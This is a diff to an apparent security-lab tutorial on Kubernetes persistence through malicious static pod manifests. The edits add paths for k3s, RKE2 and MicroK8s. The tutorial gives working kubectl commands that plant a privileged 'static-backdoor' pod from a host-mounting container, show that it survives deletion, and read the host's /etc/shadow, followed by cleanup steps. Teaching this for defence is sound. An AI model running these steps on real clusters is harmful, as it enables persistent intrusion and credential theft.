@@ -11,7 +11,18 @@ Static pods are managed directly by the `kubelet` daemon on a specific node, not
 - **Survives API server outages** — the kubelet manages the pod lifecycle independently.
 - **Persistence on the node** — as long as the manifest file exists on the node's filesystem, the pod will always be running.
 
-The attack requires writing a file to `/etc/kubernetes/manifests/` (or wherever the kubelet's `staticPodPath` is configured). This is typically achieved by first obtaining a privileged container that mounts the host filesystem.
+The attack requires writing a file to the kubelet's `staticPodPath` directory. This is typically achieved by first obtaining a privileged container that mounts the host filesystem.
+
+> **Note:** The static pod directory varies by distribution:
+>
+> | Distribution | Static Pod Path | Kubelet Config |
+> |---|---|---|
+> | Kind / kubeadm | `/etc/kubernetes/manifests` | `/var/lib/kubelet/config.yaml` |
+> | k3s | `/var/lib/rancher/k3s/agent/pod-manifests` | `/var/lib/rancher/k3s/agent/etc/containerd/config.toml` |
+> | RKE2 | `/var/lib/rancher/rke2/agent/pod-manifests` | `/var/lib/rancher/rke2/agent/etc/containerd/config.toml` |
+> | MicroK8s | `/var/snap/microk8s/common/args/conf.d/` | via snap config |
+>
+> k3s and RKE2 do not ship control-plane components as static pods — they run them as embedded processes. The static pod directory still exists and works, but it will be empty by default.
 
 ## Prerequisites
 
@@ -41,15 +52,22 @@ Confirm you can read the host filesystem:
 kubectl exec node-access -- ls /host/etc/kubernetes/
 ```
 
-Expected output (on the Kind control-plane node):
+Expected output on a **Kind / kubeadm** control-plane node:
 
 ```
 admin.conf  controller-manager.conf  kubelet.conf  manifests  pki  scheduler.conf  super-admin.conf
 ```
 
+> **k3s / RKE2:** The `/etc/kubernetes/` directory may not exist or may be sparse. Instead, check:
+> ```bash
+> kubectl exec node-access -- ls /host/var/lib/rancher/k3s/agent/pod-manifests/
+> ```
+
 ### Step 2 — Locate the kubelet static pod directory
 
-The kubelet reads static pod manifests from the path configured in its config file. On kubeadm-based clusters (including Kind) this is `/etc/kubernetes/manifests`:
+The kubelet reads static pod manifests from the path configured in its config file. Find it by inspecting the kubelet configuration:
+
+**Kind / kubeadm:**
 
 ```bash
 kubectl exec node-access -- cat /host/var/lib/kubelet/config.yaml | grep static
@@ -61,17 +79,46 @@ Expected output:
 staticPodPath: /etc/kubernetes/manifests
 ```
 
-Inspect the existing static pod manifests (control-plane components on the node):
+**k3s:**
 
 ```bash
-kubectl exec node-access -- ls /host/etc/kubernetes/manifests/
+kubectl exec node-access -- sh -c '
+  # k3s embeds the kubelet; the static pod path is fixed:
+  STATIC_PATH="/var/lib/rancher/k3s/agent/pod-manifests"
+  if [ -d "/host${STATIC_PATH}" ]; then
+    echo "staticPodPath: ${STATIC_PATH}"
+  else
+    echo "Static pod directory not found — check your distribution docs"
+  fi
+'
 ```
 
-Expected output on a control-plane node:
+Set a variable for the rest of the tutorial (adjust for your distribution):
+
+```bash
+# Kind / kubeadm:
+STATIC_POD_PATH="/etc/kubernetes/manifests"
+
+# k3s:
+# STATIC_POD_PATH="/var/lib/rancher/k3s/agent/pod-manifests"
+
+# RKE2:
+# STATIC_POD_PATH="/var/lib/rancher/rke2/agent/pod-manifests"
+```
+
+Inspect the existing static pod manifests:
+
+```bash
+kubectl exec node-access -- ls /host${STATIC_POD_PATH}/
+```
+
+Expected output on a **Kind / kubeadm** control-plane node:
 
 ```
 etcd.yaml  kube-apiserver.yaml  kube-controller-manager.yaml  kube-scheduler.yaml
 ```
+
+> **k3s / RKE2:** This directory will be empty by default — these distributions run control-plane components as embedded processes, not static pods. The directory still works for deploying your own static pods.
 
 ### Step 3 — Write the malicious static pod manifest
 
@@ -79,13 +126,13 @@ The file `static-pod-manifest.yaml` defines a privileged backdoor pod. Copy it t
 
 ```bash
 kubectl cp static-pod-manifest.yaml \
-    node-access:/host/etc/kubernetes/manifests/static-backdoor.yaml
+    node-access:/host${STATIC_POD_PATH}/static-backdoor.yaml
 ```
 
 Verify the file was written:
 
 ```bash
-kubectl exec node-access -- ls -la /host/etc/kubernetes/manifests/static-backdoor.yaml
+kubectl exec node-access -- ls -la /host${STATIC_POD_PATH}/static-backdoor.yaml
 ```
 
 > **Note:** The `kubectl exec -- sh -c "cat > /path" < localfile` pattern does **not** work with `kubectl exec` — stdin redirection applies to the local shell, not the exec session. Use `kubectl cp` to transfer files into a running pod.
@@ -98,29 +145,32 @@ The kubelet watches the manifest directory and picks up new files within a few s
 kubectl get pods -n kube-system --watch
 ```
 
-Look for a pod with a node-name suffix matching the cluster name and node (e.g., `static-backdoor-kind-control-plane` for a cluster named `kind`). This is the mirror pod created by the API server.
+Look for a pod named `static-backdoor-<node-name>`. The kubelet appends the hostname of the node where it runs. This is the mirror pod created by the API server.
 
-Expected output:
+Expected output examples:
 
 ```
-NAME                                         READY   STATUS    RESTARTS   AGE
+# Kind (node name = kind-control-plane):
 static-backdoor-kind-control-plane           1/1     Running   0          8s
+
+# k3s (node name = server1):
+static-backdoor-server1                      1/1     Running   0          8s
 ```
 
-> **Note:** The mirror pod name suffix is `<cluster-name>-control-plane`. For a cluster named `workshop-cluster` it would be `static-backdoor-workshop-cluster-control-plane`.
+> **Tip:** Find your node name with `kubectl get nodes` and look for `static-backdoor-<your-node-name>` in the output.
 
 ### Step 5 — Demonstrate that kubectl delete does NOT remove the pod
 
-Try to delete the mirror pod using kubectl (replace the suffix with your actual pod name from Step 4):
+Try to delete the mirror pod using kubectl (replace `<node-name>` with your actual node name from Step 4):
 
 ```bash
-kubectl delete pod -n kube-system static-backdoor-kind-control-plane
+kubectl delete pod -n kube-system static-backdoor-<node-name>
 ```
 
 Expected output:
 
 ```
-pod "static-backdoor-kind-control-plane" deleted
+pod "static-backdoor-<node-name>" deleted
 ```
 
 Wait a few seconds and check again:
@@ -133,10 +183,10 @@ The pod is back. The kubelet recreates the mirror pod immediately because the ma
 
 ### Step 6 — Verify host-level capabilities of the static pod
 
-Exec into the static pod and confirm its capabilities (replace the pod name suffix as needed):
+Exec into the static pod and confirm its capabilities (replace `<node-name>` with your actual node name):
 
 ```bash
-kubectl exec -n kube-system static-backdoor-kind-control-plane -- sh -c '
+kubectl exec -n kube-system static-backdoor-<node-name> -- sh -c '
   # Read host /etc/shadow
   cat /host/etc/shadow | head -5
 
@@ -153,7 +203,7 @@ kubectl exec -n kube-system static-backdoor-kind-control-plane -- sh -c '
 Removing the static pod requires deleting the manifest file from the node filesystem — not just running `kubectl delete`:
 
 ```bash
-kubectl exec node-access -- rm /host/etc/kubernetes/manifests/static-backdoor.yaml
+kubectl exec node-access -- rm /host${STATIC_POD_PATH}/static-backdoor.yaml
 ```
 
 Confirm the static pod is gone:
@@ -166,7 +216,8 @@ kubectl get pods -n kube-system | grep static-backdoor
 
 ```bash
 # Remove the manifest file from the node (if not already done in Step 7)
-kubectl exec node-access -- rm -f /host/etc/kubernetes/manifests/static-backdoor.yaml
+# Use the STATIC_POD_PATH you set in Step 2
+kubectl exec node-access -- rm -f /host${STATIC_POD_PATH}/static-backdoor.yaml
 
 # Wait a few seconds and confirm the static pod mirror is gone
 kubectl get pods -n kube-system | grep static-backdoor
@@ -175,9 +226,13 @@ kubectl get pods -n kube-system | grep static-backdoor
 kubectl delete -f privileged-pod.yaml
 ```
 
-> **Emergency cleanup:** If the `node-access` pod is no longer running, you can remove the manifest file directly via Docker:
+> **Emergency cleanup:** If the `node-access` pod is no longer running, remove the manifest file directly on the node:
 > ```bash
+> # Kind:
 > docker exec kind-control-plane rm -f /etc/kubernetes/manifests/static-backdoor.yaml
+>
+> # k3s (SSH to the node):
+> sudo rm -f /var/lib/rancher/k3s/agent/pod-manifests/static-backdoor.yaml
 > ```
 
 ## Resources
